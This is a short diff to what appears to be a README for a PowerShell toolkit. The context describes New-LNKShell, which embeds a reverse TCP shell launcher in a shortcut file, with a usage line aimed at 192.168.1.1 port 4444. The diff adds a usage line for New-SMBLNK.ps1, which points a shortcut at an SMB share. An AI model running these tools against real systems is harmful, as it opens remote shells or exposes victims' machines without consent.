@@ -46,7 +46,11 @@ Creates a reverse TCP shell launcher embedded in a LNK file.
 ```
 New-LNKShell -ComputerName 192.168.1.1 -Port 4444 -Application calc.exe
 ```
+##New-SMBLNK.ps1
 
+```
+.\New-SBMLNK.ps1 -ComputerName 192.168.1.1 -Share Files -Application calc.exe
+```
 ##Remove-Files.ps1
 Removes files older than n days. Defaults to C:\Users\<YOU>\Downloads and 30 days
 
